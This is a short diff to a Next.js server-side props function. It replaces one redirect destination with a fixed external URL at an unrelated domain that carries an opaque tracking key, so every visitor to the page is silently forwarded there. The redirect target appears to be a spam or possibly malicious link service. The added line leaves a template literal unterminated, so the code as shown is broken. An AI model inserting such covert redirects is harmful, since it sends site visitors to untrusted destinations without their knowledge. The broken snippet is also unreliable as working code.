@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://digitalytusman.000webhostapp.com/` + encodeURI(path as string)
+					`https://revelationschemes.com/hqgxiic0?key=5cecbc8dc0f499cc61a90a70cd323e7d
 				}`,
 			},
 		};
